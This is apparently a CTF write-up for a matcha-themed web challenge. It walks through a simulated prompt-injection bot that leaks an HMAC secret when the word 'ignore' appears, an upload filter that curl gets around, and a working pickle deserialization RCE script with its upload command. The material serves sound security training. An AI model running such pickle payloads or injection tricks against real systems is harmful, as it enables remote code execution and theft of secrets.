# 🍵MATCHA_w0r1d!
Misc CTF wargame presented at **The 31st PoC Hacking Camp**
> Share your most photogenic matcha dessert creations — from cakes to parfaits, ice creams to lattes — and celebrate the harmony of taste and aesthetics. By the way, there may be a secret SPY hiding in this contest...
<img width="1900" height="938" alt="Image" src="https://github.com/user-attachments/assets/6cf79bda-b459-4211-8844-37661d539efe" />

---

## Main Vulnerabilities
- Pickle deserialization vulnerability
- Prompt injection-style logic (rule-based, no real LLM)
- Remote code execution(RCE) 
- File upload vulnerability
- ...and some Miscellaneous tricks hidden throughout

---

## Scenario
### 1. Ask MATCHA bot — Steal the **SECRET**.
> This is prompt injection-style system. You can simply inject keyword `"ignore"` into your prompt to extract the secret key. 
> *(Note: It's implemented using simple hardcoded logic, not the actual OpenAI API, due to practical constraints in the CTF environment.)*

<p align="center">
  <img src="https://github.com/user-attachments/assets/9257c097-292f-4160-9840-8155d593df90" width="32%" />
  <img src="https://github.com/user-attachments/assets/7f8a768c-080e-4ebf-9aac-fa012d8eb5b5" width="32%" />
  <img src="https://github.com/user-attachments/assets/b41d3833-cd1a-4a0e-9021-b104dd3cf11c" width="31.5%" />
</p>

- If you successfully make the MATCHA bot ignore the initial instruction that prohibits revealing the secret key, you'll receive the following encoded string: `zaqwedsMrfvMuytgbnmMqazescMrfvbMjkiuyhnm,M_WasdeszxWtfcWiuygvbnWesztdcWygvbWklpoijnm,`
  - You can deduce the meaning of this string using your keyboard layout → `pickle_tickle`
  - This is the secret key used to generate the **HMAC signature**, which is essential for the following `curl`-based exploit afterwards.
  - And since the string contains "pickle", it should remind you of the **pickle deserialization vulnerability**.

---

### 2. Upload function
> You can upload your matcha dessert picture using the `UPLOAD` button, and view your submitted files via the `MY SUBMISSIONS` button.

<p align="left">
  <img src="https://github.com/user-attachments/assets/c4cece09-2200-4fb7-ae0d-b1d143ff03ad" width="60%" />
</p>

- The server filters file extensions — only `.jpg`, `.png`, and `.pkl` files are allowed.
- Files with `.jpg` or `.png` extensions are displayed on the site using the `MY SUBMISSIONS` button.
- However, `.pkl` files **cannot be uploaded via the browser UI**, nor are they displayed.
- - The attacker must recognize this limitation and switch to using the `curl` command from the terminal to upload `.pkl` file afterwards.

<p align="center">
  <img src="https://github.com/user-attachments/assets/febec0ae-06f3-4478-9d17-14fe29ee8140" />
</p>

- You can infer the path where your submission files are stored via DevTools (F12): `/uploads/{filename}`
  - However, this is not the actual full path — the real path is `app/uploads/{filename}`
  - You can find this clue from the UI element shown below:

<p align="center">
  <img src="https://github.com/user-attachments/assets/1faaf1bd-c747-4fae-a97e-fa8408f97e4d" width="80%" />
</p>

---

### 3. Exploit 
> Using the file path and SECRET key you obtained in the previous step, you can craft an RCE payload as shown below. 
> The location of `flag.txt` is provided in advance — it's in the same directory as `app.py`.

```python
# attack scenario (test)
# this is the script file which the attacker uses in his local PC
import pickle, os, hashlib, hmac

# print(os.path.abspath("app/uploads"))
UPLOAD_DIR = '/app/uploads'
uuid = "d7fead..."

class RCE:
    def __reduce__(self):
        return (os.system, (f"cat /flag.txt > {UPLOAD_DIR}/{uuid}/hacked.txt",))

SECRET_KEY = "pickle_tickle"
payload = pickle.dumps(RCE())
sig = hmac.new(SECRET_KEY.encode(), payload, hashlib.sha256).hexdigest()

with open("malicious.pkl", "wb") as f:
    f.write(payload)

print(f"HMAC signature: {sig}")
```
---

### 4. Upload the `.pkl` via `$curl`
> Use the curl command to upload your crafted pickle file to `app/uploads/`. Upon upload, the RCE will trigger automatically and execute the injected command.
> Note: The HMAC signature may differ from the example depending on your script written in step 3.

```bash
curl -X POST http://127.0.0.1:5000/upload \
  -F "file=@malicious.pkl" \
  -F "sig=90c67..." \
  -F "uuid=d7fead..."
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/d75172f2-a7ba-448e-8d4c-63a8fccf7646" width="90%" />
</p>

---

### 5. Catch the FLAG 🚩
> Check out the `.txt` file you uploaded via the RCE attack in the MY SUBMISSIONS section.
> Once you click the file, the flag will be revealed as below:

<p align="center">
  <img src="https://github.com/user-attachments/assets/7337c346-8fa6-4428-a56f-3d6fc08751a4" width="70%" />
</p>

---

## Tricks & "Intended" Unintended Elements
### 1. Hint for pickle vulnerability
<p align="center">
  <img src="https://github.com/user-attachments/assets/fe994a9c-9794-41b3-8208-d2e268a01524" width="70%" />
</p>

- Here are some icons that redirects you to various SNS platforms — but the final icon leads somewhere special.
- Clicking the last icon redirects you to a site called *“A jar of pickles.”*
- This is a subtle hint toward the pickle vulnerability, offering an easier discovery path than the prompt injection above.

<p align="center">
  <img src="https://github.com/user-attachments/assets/ae898934-05f0-44d1-b40e-22ab049ef684" width="70%" />
</p>

### 2. Intended "Trap" Functionality
<p align="center">
  <img src="https://github.com/user-attachments/assets/2fbb9924-1b8c-4aa7-8230-3c4e1afd5e00" width="70%" />
</p>

- There's also a section where you can enter text and "send" it to the server.
- However, this function is a decoy — there’s no actual logic implemented either on the client or server side.
- It’s intentionally designed to mislead attackers into thinking there might be an XSS or another exploitable feature.

